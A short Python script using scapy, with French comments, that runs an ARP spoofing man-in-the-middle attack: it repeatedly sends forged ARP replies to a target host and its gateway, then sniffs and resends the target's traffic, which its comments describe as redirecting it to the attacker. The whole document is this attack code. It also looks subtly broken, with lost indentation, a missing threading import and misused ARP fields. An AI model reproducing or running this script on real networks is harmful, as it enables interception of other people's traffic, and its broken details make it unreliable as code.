from scapy.all import *
import time
# Définir les adresses MAC et IP cibles et sources
target_ip = "192.168.1.1"
spoofed_ip = "192.168.1.100"
spoofed_mac = "00:11:22:33:44:55"
gateway_ip = "192.168.1.254"
# Fonction pour envoyer des paquets ARP spoofés en boucle
def arp_spoof(target_ip, gateway_ip, spoofed_mac, spoofed_ip):
while True:
# Envoyer une trame ARP spoofée à la cible
target_arp = ARP(op=2, pdst=target_ip, hwdst=spoofed_mac, psrc=gateway_ip)
send(target_arp)
# Envoyer une trame ARP spoofée à la passerelle
gateway_arp = ARP(op=2, pdst=gateway_ip, hwdst=spoofed_mac, psrc=target_ip)
send(gateway_arp)
time.sleep(2)
# Lancer l'attaque ARP spoofing
arp_spoof_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip, spoofed_mac, spoofed_ip))
arp_spoof_thread.start()
# Fonction pour rediriger le trafic de la cible vers le pirate informatique
def sniff_and_forward():
while True:
pkt = sniff(filter="host "+target_ip, count=1)
sendp(pkt[0], iface="eth0", verbose=0)
# Lancer l'écoute et la redirection de trafic
sniff_and_forward_thread = threading.Thread(target=sniff_and_forward)
sniff_and_forward_thread.start()
